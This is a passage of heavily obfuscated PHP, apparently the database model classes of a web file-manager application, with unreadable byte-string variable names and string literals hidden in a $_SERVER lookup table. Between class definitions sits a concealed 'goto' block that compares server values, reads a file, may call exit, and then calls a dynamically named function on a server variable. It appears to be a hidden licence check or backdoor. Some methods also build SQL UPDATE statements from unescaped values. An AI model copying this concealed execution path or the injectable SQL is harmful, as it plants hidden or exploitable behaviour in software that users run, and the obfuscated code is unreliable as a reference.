$²ÄÖˆ¦, $²‡¯Áû[353] => $´­åê, $²‡¯Áû[368] => $³å˜ŸÁù), $²‡¯Áû[369] => $ãŠÈ‚Ü¯); return $«äÅÁÔ; } protected function checkLength($­¸¨€ÖË, $ğ‰òáĞó = 0, $Æ°ÛŠ¡æ = '') { $Ñø¾ÁÑĞ =& $_SERVER[ïëó©ÒÚ]; $ğ‰òáĞó = $ğ‰òáĞó ? $ğ‰òáĞó : 65536; if (!$­¸¨€ÖË || strlen($­¸¨€ÖË) < $ğ‰òáĞó) { return; } $Æ°ÛŠ¡æ = $Æ°ÛŠ¡æ ? $Æ°ÛŠ¡æ . $Ñø¾ÁÑĞ[71] : $Ñø¾ÁÑĞ[12]; show_json($Æ°ÛŠ¡æ . LNG($Ñø¾ÁÑĞ[370]) . "\50{$ğ‰òáĞó}\x29", !1); } protected function metaSet($›ğ‡€¦, $í‡‰Ğ·Ñ = null, $úş…²şÍ = null) { $ï¤Şå‹Ù =& $_SERVER[ïëó©ÒÚ]; if (!$this->tableMeta || !$›ğ‡€¦) { return !1; } $ÆàÒúçÓ = $this->tableMeta[$ï¤Şå‹Ù[371]]; $¾½¬»Ä  = $this->tableMeta[$ï¤Şå‹Ù[372]]; $À¶öåïë = Model($¾½¬»Ä ); $¸€ğşŸ = array($ÆàÒúçÓ => $›ğ‡€¦, $ï¤Şå‹Ù[373] => $í‡‰Ğ·Ñ); if (is_null($í‡‰Ğ·Ñ)) { return $À¶öåïë->where(array($ÆàÒúçÓ => $›ğ‡€¦))->delete(); } if (is_null($úş…²şÍ) && is_string($í‡‰Ğ·Ñ)) { return $À¶öåïë->where($¸€ğşŸ)->delete(); } $÷Òƒäà = is_array($í‡‰Ğ·Ñ) ? $í‡‰Ğ·Ñ : array(); if (is_string($í‡‰Ğ·Ñ)) { $÷Òƒäà[$í‡‰Ğ·Ñ] = $úş…²şÍ; } $ª²³Ò»£ = array(); foreach ($÷Òƒäà as $Œ¯í‰Ì => $úÑèÃÓÊ) { if (is_null($úÑèÃÓÊ) && is_string($Œ¯í‰Ì)) { $À¶öåïë->where(array($ÆàÒúçÓ => $›ğ‡€¦, $ï¤Şå‹Ù[373] => $Œ¯í‰Ì))->delete(); continue; } $this->checkLength($úÑèÃÓÊ, !1, $¾½¬»Ä  . $ï¤Şå‹Ù[4] . $Œ¯í‰Ì); $ª²³Ò»£[] = array($ÆàÒúçÓ => $›ğ‡€¦, $ï¤Şå‹Ù[94] => $Œ¯í‰Ì, $ï¤Şå‹Ù[374] => $úÑèÃÓÊ); } $½„¹¯ÊÕ = $ï¤Şå‹Ù[375] . $¾½¬»Ä ; CacheLock::lock($½„¹¯ÊÕ); $À¶öåïë->where(array($ÆàÒúçÓ => $›ğ‡€¦))->addAll($ª²³Ò»£, array(), !0); CacheLock::unlock($½„¹¯ÊÕ); return !0; } public function metaGet($‚¥ÕşôŠ, $ áİ€ßÕ = false) { $œÎ¥ØÇü =& $_SERVER[ïëó©ÒÚ]; if (!$this->tableMeta) { return array(); } $ä°èË¹‡ = $this->tableMeta[$œÎ¥ØÇü[371]]; $ç±Ìùü‘ = Model($this->tableMeta[$œÎ¥ØÇü[372]]); if ($ áİ€ßÕ) { $§…Öìç = array($ä°èË¹‡ => $‚¥ÕşôŠ, $œÎ¥ØÇü[94] => $ áİ€ßÕ); return $ç±Ìùü‘->where($§…Öìç)->getField($œÎ¥ØÇü[374]); } $§…Öìç = array($ä°èË¹‡ => $‚¥ÕşôŠ); $¢‹¸ íó = $ç±Ìùü‘->field($œÎ¥ØÇü[376])->where($§…Öìç)->select(); $¢‹¸ íó = array_to_keyvalue($¢‹¸ íó, $œÎ¥ØÇü[94], $œÎ¥ØÇü[374]); return $¢‹¸ íó; } private function checkDataAutoHas($±ÓçñĞÇ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $É±ä’Ë¶) { if (in_array($±ÓçñĞÇ, explode($_SERVER[ïëó©ÒÚ][50], $É±ä’Ë¶[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$Ò™â”¼, $ØáÆ¾ÍÜ) { $©Ó»Øàò =& $_SERVER[ïëó©ÒÚ]; if (!is_array($Ò™â”¼)) { return; } foreach ($this->dataAuto as $«ƒÄÑ³Ÿ) { $‹Õ¼ß·Ğ = $«ƒÄÑ³Ÿ[0]; if (!in_array($ØáÆ¾ÍÜ, explode($©Ó»Øàò[50], $«ƒÄÑ³Ÿ[2]))) { continue; } switch (trim($«ƒÄÑ³Ÿ[3])) { case $©Ó»Øàò[321]: case $©Ó»Øàò[322]: $ÑŒœ˜Ò = $«ƒÄÑ³Ÿ[1]; $ ¤ªÎËË = isset($«ƒÄÑ³Ÿ[4]) ? (array) $«ƒÄÑ³Ÿ[4] : array(); if ($ÑŒœ˜Ò == $©Ó»Øàò[203] && array_key_exists($‹Õ¼ß·Ğ, $Ò™â”¼)) { if (!$Ò™â”¼[$‹Õ¼ß·Ğ]) { unset($Ò™â”¼[$‹Õ¼ß·Ğ]); } break; } if (isset($Ò™â”¼[$‹Õ¼ß·Ğ])) { array_unshift($ ¤ªÎËË, $Ò™â”¼[$‹Õ¼ß·Ğ]); } if ($©Ó»Øàò[321] == $«ƒÄÑ³Ÿ[3]) { $Ò™â”¼[$‹Õ¼ß·Ğ] = call_user_func_array($ÑŒœ˜Ò, $ ¤ªÎËË); } else { $Ò™â”¼[$‹Õ¼ß·Ğ] = call_user_func_array(array(&$this, $ÑŒœ˜Ò), $ ¤ªÎËË); } break; case $©Ó»Øàò[270]: if (isset($Ò™â”¼[$‹Õ¼ß·Ğ]) && $Ò™â”¼[$‹Õ¼ß·Ğ]) { $Ò™â”¼[$‹Õ¼ß·Ğ] = call_user_func_array(array(&$this, $«ƒÄÑ³Ÿ[1]), array($Ò™â”¼[$‹Õ¼ß·Ğ])); } break; case $©Ó»Øàò[273]: $Ò™â”¼[$‹Õ¼ß·Ğ] = $Ò™â”¼[$«ƒÄÑ³Ÿ[1]]; break; case $©Ó»Øàò[294]: if (isset($Ò™â”¼[$‹Õ¼ß·Ğ]) && !is_string($Ò™â”¼[$‹Õ¼ß·Ğ])) { $Ò™â”¼[$‹Õ¼ß·Ğ] = json_encode_force($Ò™â”¼[$‹Õ¼ß·Ğ]); } break; case $©Ó»Øàò[323]: if ($Ò™â”¼[$‹Õ¼ß·Ğ] === $©Ó»Øàò[12]) { unset($Ò™â”¼[$‹Õ¼ß·Ğ]); } break; case $©Ó»Øàò[324]: $Ò™â”¼[$‹Õ¼ß·Ğ] = $«ƒÄÑ³Ÿ[1]; default: break; } } if ($ØáÆ¾ÍÜ == $©Ó»Øàò[355]) { $ÑÉ¨‰ç¯ = strtolower($this->db->getDbType()); if (strpos($ÑÉ¨‰ç¯, $©Ó»Øàò[13]) !== 0) { return; } $¥ÁÂìÒ… = $this->field(!0)->fields; $šŒÏÙœŒ = $¥ÁÂìÒ…[$©Ó»Øàò[252]]; if (isset($¥ÁÂìÒ…[$©Ó»Øàò[251]])) { unset($šŒÏÙœŒ[$¥ÁÂìÒ…[$©Ó»Øàò[251]]]); } foreach ($šŒÏÙœŒ as $¢³½×­ => $ØáÆ¾ÍÜ) { if (!isset($Ò™â”¼[$¢³½×­])) { $Ò™â”¼[$¢³½×­] = $©Ó»Øàò[12]; } } } } private function dataAfterFilter(&$ƒò³€ØÉ) { $†¶ªê¦Ì =& $_SERVER[ïëó©ÒÚ]; foreach ($this->dataAuto as $±‡´‡™) { $ï± —ĞÄ = $±‡´‡™[0]; if (!isset($ƒò³€ØÉ[$ï± —ĞÄ])) { continue; } if (!in_array($†¶ªê¦Ì[357], explode($†¶ªê¦Ì[50], $±‡´‡™[2]))) { continue; } switch (trim($±‡´‡™[3])) { case $†¶ªê¦Ì[321]: case $†¶ªê¦Ì[322]: $ÄØ÷°²î = isset($±‡´‡™[4]) ? (array) $±‡´‡™[4] : array(); array_unshift($ÄØ÷°²î, $ƒò³€ØÉ[$ï± —ĞÄ]); if (isset($±‡´‡™[4]) && $±‡´‡™[4] == $†¶ªê¦Ì[377]) { $ÄØ÷°²î = array($ƒò³€ØÉ[$ï± —ĞÄ]); } if ($†¶ªê¦Ì[321] == $±‡´‡™[3]) { $ƒò³€ØÉ[$ï± —ĞÄ] = call_user_func_array($±‡´‡™[1], $ÄØ÷°²î); } else { $ƒò³€ØÉ[$ï± —ĞÄ] = call_user_func_array(array(&$this, $±‡´‡™[1]), $ÄØ÷°²î); } break; case $†¶ªê¦Ì[270]: if (isset($ƒò³€ØÉ[$ï± —ĞÄ]) && $ƒò³€ØÉ[$ï± —ĞÄ]) { $ƒò³€ØÉ[$ï± —ĞÄ] = call_user_func_array(array(&$this, $±‡´‡™[1]), array($ƒò³€ØÉ[$ï± —ĞÄ])); } break; case $†¶ªê¦Ì[273]: $ƒò³€ØÉ[$ï± —ĞÄ] = $ƒò³€ØÉ[$±‡´‡™[1]]; break; case $†¶ªê¦Ì[294]: $æ¯É––ù = $ƒò³€ØÉ[$ï± —ĞÄ]; $ƒò³€ØÉ[$ï± —ĞÄ] = json_decode($æ¯É––ù, !0); if (is_null($ƒò³€ØÉ[$ï± —ĞÄ])) { $ƒò³€ØÉ[$ï± —ĞÄ] = $æ¯É––ù; } break; case $†¶ªê¦Ì[323]: if ($ƒò³€ØÉ[$ï± —ĞÄ] === $†¶ªê¦Ì[12]) { unset($ƒò³€ØÉ[$ï± —ĞÄ]); } break; case $†¶ªê¦Ì[324]: $ƒò³€ØÉ[$ï± —ĞÄ] = $±‡´‡™[1]; break; default: break; } } } public function saveAll($ÉÖÄ†ç) { $Ûıö‹¸— =& $_SERVER[ïëó©ÒÚ]; $ßº±Éñî = $this->tablePrefix . $this->tableName; $Âá¾¤ÏŸ = self::SQL_WHERE_IN_CHUNK; $ÉÖÄ†ç = is_array($ÉÖÄ†ç) ? $ÉÖÄ†ç : array(); $…„©Œèî = $Ûıö‹¸—[378]; $ìÚÎşˆÇ = 0; $»ÇÌ‚¿ = array(); $Ë‰¼÷Ö = count($ÉÖÄ†ç); for ($š‘ŞÉÃŒ = 0; $š‘ŞÉÃŒ < $Ë‰¼÷Ö; $š‘ŞÉÃŒ++) { $ıÈàå§ö = $ÉÖÄ†ç[$š‘ŞÉÃŒ]; if (!is_array($ıÈàå§ö) || count($ıÈàå§ö) != 4) { continue; } $Š•«§˜ã = "\x55\x50\x44\x41\124\105\x20\x60{$ßº±Éñî}\140\40\x53\x45\x54\x20{$ıÈàå§ö[2]}\x20\75\x20\103\x41\x53\x45\x20{$ıÈàå§ö[0]}\x20\xa"; if ($ìÚÎşˆÇ == 0) { $…„©Œèî = $Š•«§˜ã; } $»ÇÌ‚¿[] = $Ûıö‹¸—[118] . $ıÈàå§ö[1] . $Ûıö‹¸—[118]; $ìÚÎşˆÇ++; $…„©Œèî .= "\40\127\x48\x45\x4e\40\x27{$ıÈàå§ö[1]}\x27\40\x54\110\x45\116\40\x27{$ıÈàå§ö[3]}\47\x20\xa"; if ($ìÚÎşˆÇ == $Âá¾¤ÏŸ || $š‘ŞÉÃŒ == $Ë‰¼÷Ö - 1) { $„”´ë = implode($Ûıö‹¸—[50], $»ÇÌ‚¿); $…„©Œèî .= "\40\x45\116\x44\40\40\x57\x48\x45\x52\x45\x20{$ıÈàå§ö[0]}\x20\x49\116\40\50{$„”´ë}\51\x20"; $this->execute($…„©Œèî); $ìÚÎşˆÇ = 0; $…„©Œèî = $Š•«§˜ã; $this->chunkEventCheck(count($»ÇÌ‚¿)); $»ÇÌ‚¿ = array(); } } $this->chunkEventSet(); } public function saveAllEach($ĞËğÙ) { $ÃÖˆ©©Ò =& $_SERVER[ïëó©ÒÚ]; $ÀÛÕİçË = $this->tablePrefix . $this->tableName; foreach ($ĞËğÙ as $œ¿É®Ç”) { if (!is_array($œ¿É®Ç”) || count($œ¿É®Ç”) != 4) { continue; } $ı…ş¹¿Â = $œ¿É®Ç”[0] . $ÃÖˆ©©Ò[379] . $œ¿É®Ç”[1] . $ÃÖˆ©©Ò[118]; $ßüª©¬µ = $œ¿É®Ç”[2] . $ÃÖˆ©©Ò[379] . $œ¿É®Ç”[3] . $ÃÖˆ©©Ò[118]; $ü„õš¥¸ = "\165\160\x64\x61\x74\145\40{$ÀÛÕİçË}\40\x73\145\x74\40{$ßüª©¬µ}\x20\167\150\145\x72\145\x20{$ı…ş¹¿Â}\73"; $this->execute($ü„õš¥¸); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($ôÅï›òÁ = false, $¡àı…İ“ = false) { $this->_chunkEvent = $ôÅï›òÁ; $this->_chunkEventParam = $¡àı…İ“; } private function chunkEventCheck($æ´–Íß‘) { if (!$this->_chunkEvent) { return; } $·ò‡µ¾á = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $·ò‡µ¾á[$_SERVER[ïëó©ÒÚ][380]] = $æ´–Íß‘; Hook::trigger($this->_chunkEvent, $·ò‡µ¾á); } public function addAll($›µø¶Æ÷, $¨¾áú® = array(), $™³ö¨·¦ = false) { $²Ö¼áÕÆ =& $_SERVER[ïëó©ÒÚ]; ignore_timeout(); $ØÑé÷É = self::SQL_WHERE_IN_CHUNK; if (empty($›µø¶Æ÷)) { $this->error = think_lang($²Ö¼áÕÆ[271]); return !1; } $¨¾áú® = $this->_parseOptions($¨¾áú®); foreach ($›µø¶Æ÷ as $¹µ–æûÖ => $É¶‹ ¬¯) { $›µø¶Æ÷[$¹µ–æûÖ] = $this->_facade($É¶‹ ¬¯); $this->_beforeInsert($›µø¶Æ÷[$¹µ–æûÖ], $¨¾áú®); } if (method_exists($this->db, $²Ö¼áÕÆ[272])) { for ($†–ÛÅš® = 0; $†–ÛÅš® < count($›µø¶Æ÷); $†–ÛÅš® += $ØÑé÷É) { $¶éõ›à = array_slice($›µø¶Æ÷, $†–ÛÅš®, $ØÑé÷É); if (!is_array($¶éõ›à) || count($¶éõ›à) == 0) { break; } $ÚˆßÙŸ = $this->db->insertAll($¶éõ›à, $¨¾áú®, $™³ö¨·¦); $this->chunkEventCheck(count($¶éõ›à)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($›µø¶Æ÷ as $¹µ–æûÖ => $É¶‹ ¬¯) { $ÚˆßÙŸ = $this->db->insert($É¶‹ ¬¯, $¨¾áú®, $™³ö¨·¦); } $this->commit(); } if (!1 !== $ÚˆßÙŸ) { $ÊŠî ší = $this->getLastInsID(); if ($ÊŠî ší) { return $ÊŠî ší; } } return $ÚˆßÙŸ; } public function save($Ûƒ›İÌû = '', $öÆµáëğ = array()) { $ÙÙ°ÕìÃ =& $_SERVER[ïëó©ÒÚ]; $¾«ôÊ… = self::SQL_WHERE_IN_CHUNK; $ßı™¦øğ = $this->optionsValue(); $†äÏ³œ = $this->findWhereField($ßı™¦øğ); if (!$†äÏ³œ) { return parent::save($Ûƒ›İÌû, $öÆµáëğ); } $¶äÜóÄ­ = 0; $¹å¥ê” = $ßı™¦øğ[$ÙÙ°ÕìÃ[275]][$†äÏ³œ][1]; $¹å¥ê” = is_array($¹å¥ê”) ? $¹å¥ê” : array(); $Ì¥Â›¶ = count($¹å¥ê”); for ($ÃË‘å¨’ = 0; $ÃË‘å¨’ < $Ì¥Â›¶; $ÃË‘å¨’ += $¾«ôÊ…) { $á«µÔáë = array_slice($¹å¥ê”, $ÃË‘å¨’, $¾«ôÊ…); if (!is_array($á«µÔáë) || count($á«µÔáë) == 0) { break; } $ßı™¦øğ[$ÙÙ°ÕìÃ[275]][$†äÏ³œ][1] = $á«µÔáë; $this->optionsValue($ßı™¦øğ); $¶äÜóÄ­ += parent::save($Ûƒ›İÌû, $öÆµáëğ); $this->chunkEventCheck(count($á«µÔáë)); } $this->chunkEventSet(); return $¶äÜóÄ­; } public function add($’Êü¡öâ = '', $¸¿¥°Õ = array(), $ÅÊÊü±ı = false) { if ($this->addTaskStatus && is_array($’Êü¡öâ)) { $this->addTaskData[] = $’Êü¡öâ; return; } return parent::add($’Êü¡öâ, $¸¿¥°Õ, $ÅÊÊü±ı); } public function parseWhereLike($Ù¸±ÑÙ, $ßÊ·Û¼² = '', $õ¦•Âä = false, &$³Éï½ = false) { $ÍËšş¹ü =& $_SERVER[ïëó©ÒÚ]; $‘ˆĞ¦ø´ = $GLOBALS[$ÍËšş¹ü[6]][$ÍËšş¹ü[381]]; if (!$‘ˆĞ¦ø´[$ÍËšş¹ü[382]]) { return $Ù¸±ÑÙ; } if (!is_array($Ù¸±ÑÙ)) { return $Ù¸±ÑÙ; } $ôêüŞ¯¨ = array(); $­¸½éà¢ = 0; foreach ($Ù¸±ÑÙ as $î¯…É„³ => $ÕĞ½ß›Ú) { if (is_array($ÕĞ½ß›Ú) && count($ÕĞ½ß›Ú) == 2 && $ÕĞ½ß›Ú[0] == $ÍËšş¹ü[383] && is_string($ÕĞ½ß›Ú[1]) && substr($ÕĞ½ß›Ú[1], 0, 1) == $ÍËšş¹ü[384] && substr($ÕĞ½ß›Ú[1], strlen($ÕĞ½ß›Ú[1]) - 1, 1) == $ÍËšş¹ü[384]) { $³Éï½ = !0; $§¢Ÿş÷ë = is_string($î¯…É„³) ? $î¯…É„³ : $ßÊ·Û¼²; $ş¡è•ñ¸ = substr($ÕĞ½ß›Ú[1], 1, strlen($ÕĞ½ß›Ú[1]) - 2); $ş¡è•ñ¸ = $this->db->escapeString($ş¡è•ñ¸); if (!strpos($§¢Ÿş÷ë, $ÍËšş¹ü[10])) { $§¢Ÿş÷ë = $ÍËšş¹ü[385] . $§¢Ÿş÷ë . $ÍËšş¹ü[385]; } $³‚¯ØÈ˜ = $ÍËšş¹ü[188] . $ş¡è•ñ¸ . $ÍËšş¹ü[188]; $ş¡è•ñ¸ = str_replace(array($ÍËšş¹ü[10], $ÍËšş¹ü[386], $ÍËšş¹ü[11]), $ÍËšş¹ü[387], $ş¡è•ñ¸); if ($‘ˆĞ¦ø´[$ÍËšş¹ü[388]]) { $³‚¯ØÈ˜ = $ÍËšş¹ü[389] . $ş¡è•ñ¸ . $ÍËšş¹ü[390]; if ($‘ˆĞ¦ø´[$ÍËšş¹ü[391]]) { $³‚¯ØÈ˜ = $ÍËšş¹ü[390] . $ş¡è•ñ¸ . $ÍËšş¹ü[389]; } } $ôêüŞ¯¨[$­¸½éà¢] = $ÍËšş¹ü[392] . $§¢Ÿş÷ë . $ÍËšş¹ü[393] . $³‚¯ØÈ˜ . $ÍËšş¹ü[394]; $­¸½éà¢++; continue; } if (is_array($ÕĞ½ß›Ú)) { $ßÊ·Û¼² = is_string($î¯…É„³) ? $î¯…É„³ : $ßÊ·Û¼²; $ÕĞ½ß›Ú = $this->parseWhereLike($ÕĞ½ß›Ú, $ßÊ·Û¼², !0, $³Éï½); } if (is_numeric($î¯…É„³)) { $ôêüŞ¯¨[$­¸½éà¢] = $ÕĞ½ß›Ú; $­¸½éà¢++; } else { $ôêüŞ¯¨[$î¯…É„³] = $ÕĞ½ß›Ú; } } if ($³Éï½ && !$õ¦•Âä) { } return $ôêüŞ¯¨; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($ûçÌ„‚¾ = array()) { $’ıƒë´ =& $_SERVER[ïëó©ÒÚ]; $Ûòé…İ = self::SQL_WHERE_IN_CHUNK; $âğ£Ìú– = $this->optionsValue(); $Âèš°Ã = $this->findWhereField($âğ£Ìú–); if (!$Âèš°Ã || isset($âğ£Ìú–[$’ıƒë´[292]]) || isset($âğ£Ìú–[$’ıƒë´[353]])) { return parent::select($ûçÌ„‚¾); } $„Œãß¥Ø = $âğ£Ìú–[$’ıƒë´[275]][$Âèš°Ã][1]; $„Œãß¥Ø = is_array($„Œãß¥Ø) ? $„Œãß¥Ø : array(); $«õ¼ß¶ = null; for ($Ëµ¿¿ä× = 0; $Ëµ¿¿ä× < count($„Œãß¥Ø); $Ëµ¿¿ä× += $Ûòé…İ) { $ïúÍ‘¿ = array_slice($„Œãß¥Ø, $Ëµ¿¿ä×, $Ûòé…İ); if (!is_array($ïúÍ‘¿) || count($ïúÍ‘¿) == 0) { break; } $âğ£Ìú–[$’ıƒë´[275]][$Âèš°Ã][1] = $ïúÍ‘¿; $this->optionsValue($âğ£Ìú–); $©ïâ”â‹ = parent::select($ûçÌ„‚¾); if (!$©ïâ”â‹) { continue; } $«õ¼ß¶ = is_array($«õ¼ß¶) ? $«õ¼ß¶ : array(); $«õ¼ß¶ = array_merge($«õ¼ß¶, $©ïâ”â‹); } return $«õ¼ß¶; } public function delete($¨ÄÓäô = array()) { $°Íš‚½ =& $_SERVER[ïëó©ÒÚ]; $ùé Ãƒ = self::SQL_WHERE_IN_CHUNK; $×Æ‘—ˆ = $this->optionsValue(); $”ÇŠÔÀ˜ = $this->findWhereField($×Æ‘—ˆ); if (!$”ÇŠÔÀ˜) { return parent::delete($¨ÄÓäô); } $ğà‘„à = 0; $·†§ô»Ğ = $×Æ‘—ˆ[$°Íš‚½[275]][$”ÇŠÔÀ˜][1]; $·†§ô»Ğ = is_array($·†§ô»Ğ) ? $·†§ô»Ğ : array(); for ($ÕøŒ¢Á = 0; $ÕøŒ¢Á < count($·†§ô»Ğ); $ÕøŒ¢Á += $ùé Ãƒ) { $…Ù³ßóœ = array_slice($·†§ô»Ğ, $ÕøŒ¢Á, $ùé Ãƒ); if (!is_array($…Ù³ßóœ) || count($…Ù³ßóœ) == 0) { break; } $×Æ‘—ˆ[$°Íš‚½[275]][$”ÇŠÔÀ˜][1] = $…Ù³ßóœ; $this->optionsValue($×Æ‘—ˆ); $ğà‘„à += parent::delete($¨ÄÓäô); } return $ğà‘„à; } private function findWhereField($ùˆ¢ÀÈ™) { $€¶•Üã =& $_SERVER[ïëó©ÒÚ]; $˜ÑÁŠä’ = self::SQL_WHERE_IN_CHUNK; if (!is_array($ùˆ¢ÀÈ™) || !is_array($ùˆ¢ÀÈ™[$€¶•Üã[275]])) { return !1; } foreach ($ùˆ¢ÀÈ™[$€¶•Üã[275]] as $êÖßÑÛÎ => $î›£®ƒ) { if (is_array($î›£®ƒ) && isset($î›£®ƒ[0]) && is_string($î›£®ƒ[0]) && strtolower($î›£®ƒ[0]) == $€¶•Üã[7] && is_array($î›£®ƒ[1]) && count($î›£®ƒ[1]) > $˜ÑÁŠä’) { ignore_timeout(); return $êÖßÑÛÎ; } } return !1; } public function setMasterDB($Ò£‘ßÌ… = true) { think_config($_SERVER[ïëó©ÒÚ][395], $Ò£‘ßÌ…); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\163\x74\145\x6d\117\x70\164\151\x6f\156"; public $field = array(); public function listData($ğÕƒÜïà = false, $˜ëåÛØÉ = "\x6d\157\144\x69\146\x79\124\x69\x6d\145", $«ÂÀ²Ø = false) { $üüš»©¶ = Model($this->modelType)->get(!1, $this->optionType, !0); $£ê¶å­ä = array_values($üüš»©¶); if ($£ê¶å­ä && $£ê¶å­ä[0] && !is_array($£ê¶å­ä[0])) { Model($this->modelType)->cacheRemove($this->optionType); $üüš»©¶ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$üüš»©¶) { return $ğÕƒÜïà ? null : array(); } if (!$ğÕƒÜïà) { $üüš»©¶ = array_filter(array_values($üüš»©¶)); return array_sort_by($üüš»©¶, $˜ëåÛØÉ, $«ÂÀ²Ø); } return $üüš»©¶[$_SERVER[ïëó©ÒÚ][396] . $ğÕƒÜïà]; } public function insert($Ğé×å†¬) { $‚·ÜŒ»Í =& $_SERVER[ïëó©ÒÚ]; $Ğé×å†¬ = array_field_key($Ğé×å†¬, $this->field); $†Ë¼Î† = Model($this->modelType)->get($‚·ÜŒ»Í[397], $this->optionType . $‚·ÜŒ»Í[398]); $†Ë¼Î† = $†Ë¼Î† ? $†Ë¼Î† : 0; $Ğé×å†¬[$‚·ÜŒ»Í[399]] = ++$†Ë¼Î†; $Ğé×å†¬[$‚·ÜŒ»Í[200]] = time(); $Ğé×å†¬[$‚·ÜŒ»Í[85]] = time(); Model($this->modelType)->set($‚·ÜŒ»Í[397], $†Ë¼Î†, $this->optionType . $‚·ÜŒ»Í[398]); Model($this->modelType)->set($‚·ÜŒ»Í[396] . $†Ë¼Î†, $Ğé×å†¬, $this->optionType); return $†Ë¼Î†; } public function update($ÅìôŸø, $ìôÖôÉÚ) { $öÇˆ¢Ì· =& $_SERVER[ïëó©ÒÚ]; $ìôÖôÉÚ = array_field_key($ìôÖôÉÚ, $this->field); $ÜÜ’ßõ = $this->listData($ÅìôŸø); if (!$ÜÜ’ßõ || !$ÅìôŸø) { return !1; } $ìôÖôÉÚ = array_merge($ÜÜ’ßõ, $ìôÖôÉÚ); $ìôÖôÉÚ[$öÇˆ¢Ì·[85]] = time(); return Model($this->modelType)->set($öÇˆ¢Ì·[396] . $ÅìôŸø, $ìôÖôÉÚ, $this->optionType); } public function remove($…í˜¼òÑ) { if (!$…í˜¼òÑ) { return !1; } return Model($this->modelType)->remove($_SERVER[ïëó©ÒÚ][396] . $…í˜¼òÑ, $this->optionType); } public function clear() { $õˆ®¦­Ÿ =& $_SERVER[ïëó©ÒÚ]; Model($this->modelType)->remove($õˆ®¦­Ÿ[397], $this->optionType . $õˆ®¦­Ÿ[398]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($—éı„ò³, $¬×ã˜°Å) { if (!$¬×ã˜°Å) { return !1; } $¥»àõÎ = $this->listData(); $¥»àõÎ = array_to_keyvalue($¥»àõÎ, $—éı„ò³); return isset($¥»àõÎ[$¬×ã˜°Å]) ? $¥»àõÎ[$¬×ã˜°Å] : !1; } public function findByName($ö÷×’ƒÊ) { return $this->findByKey($_SERVER[ïëó©ÒÚ][32], $ö÷×’ƒÊ); } protected function resetData($äŠÄ‚¸Ù) { $é´İÙä =& $_SERVER[ïëó©ÒÚ]; $äŠÄ‚¸Ù = is_array($äŠÄ‚¸Ù) ? $äŠÄ‚¸Ù : array(); $È®ÜŞö = array(); for ($¸Ÿ´øÄƒ = 0; $¸Ÿ´øÄƒ < count($äŠÄ‚¸Ù); $¸Ÿ´øÄƒ++) { $È®ÜŞö[$é´İÙä[396] . $äŠÄ‚¸Ù[$¸Ÿ´øÄƒ][$é´İÙä[399]]] = $äŠÄ‚¸Ù[$¸Ÿ´øÄƒ]; } return Model($this->modelType)->set($È®ÜŞö, !1, $this->optionType); } private function getAutoName($Ë´Í”íØ) { $ß“Üâ¿´ = array_to_keyvalue($this->listData(), $_SERVER[ïëó©ÒÚ][32]); if (!$ß“Üâ¿´ || !isset($ß“Üâ¿´[$Ë´Í”íØ])) { return $Ë´Í”íØ; } for ($ÁÇÇÇ› = 1; $ÁÇÇÇ› < count($ß“Üâ¿´); $ÁÇÇÇ›++) { $°ı¹œ§í = $Ë´Í”íØ . "\50{$ÁÇÇÇ›}\51"; if (!isset($ß“Üâ¿´[$°ı¹œ§í])) { return $°ı¹œ§í; } } return $°ı¹œ§í; } } goto céÏ¼ÑÀàŞ; céÏ¼ÑÀàŞ: if ($_SERVER[$_SERVER[ïëó©ÒÚ][400]] != $_SERVER[$_SERVER[ïëó©ÒÚ][401]]) { $_getc = $_SERVER[ïëó©ÒÚ][402]; $_getfile = $_SERVER[$_SERVER[ïëó©ÒÚ][403]] . $_SERVER[ïëó©ÒÚ][404]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ïëó©ÒÚ][231], $_getfilec); if (count($_getarrs) < $_SERVER[ïëó©ÒÚ][405]) { $exit = $_SERVER[ïëó©ÒÚ][406]; $exit(); } $_act = $_SERVER[ïëó©ÒÚ][407]; $_act($_SERVER[$_SERVER[ïëó©ÒÚ][408]]); } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($ªİáñÃ = false, $Ğé…¶Ü = '', $Ööşö£¹ = false) { $§º´é–» =& $_SERVER[ïëó©ÒÚ]; $üÙÚÓÑŠ = $this->cacheGet($Ğé…¶Ü); $óÛÏ½¼Õ = $this->optionDefault($Ğé…¶Ü); $óÛÏ½¼Õ = is_array($óÛÏ½¼Õ) ? $óÛÏ½¼Õ : array(); if (is_array($üÙÚÓÑŠ)) { $üÙÚÓÑŠ = array_merge($óÛÏ½¼Õ, $üÙÚÓÑŠ); return $ªİáñÃ ? isset($üÙÚÓÑŠ[$ªİáñÃ]) ? $üÙÚÓÑŠ[$ªİáñÃ] : null : $üÙÚÓÑŠ; } $Ì¢ÀÎ¯ä = $this->filterWhere(array($§º´é–»[33] => $Ğé…¶Ü)); $üÙÚÓÑŠ = $this->where($Ì¢ÀÎ¯ä)->select(); $üÙÚÓÑŠ = array_to_keyvalue($üÙÚÓÑŠ, $§º´é–»[94], $§º´é–»[374]); foreach ($üÙÚÓÑŠ as $±åÌ˜šÑ => $¤…÷ıÌï) { if ($Ööşö£¹ || in_array($±åÌ˜šÑ, $this->jsonField)) { $üÙÚÓÑŠ[$±åÌ˜šÑ] = json_decode($¤…÷ıÌï, !0); } } $this->cacheSet($Ğé…¶Ü, $üÙÚÓÑŠ); $üÙÚÓÑŠ = array_merge($óÛÏ½¼Õ, $üÙÚÓÑŠ); return $ªİáñÃ ? $üÙÚÓÑŠ[$ªİáñÃ] : $üÙÚÓÑŠ; } public function set($©Ôô½¬«, $øŸÛ©˜à = false, $İı÷Ú¹Ç = '') { $¬Äü†ŸÚ =& $_SERVER[ïëó©ÒÚ]; $this->cacheRemove($İı÷Ú¹Ç); $·ø¥É¥¤ = array(); $ò—Î·ßõ = is_array($©Ôô½¬«) ? 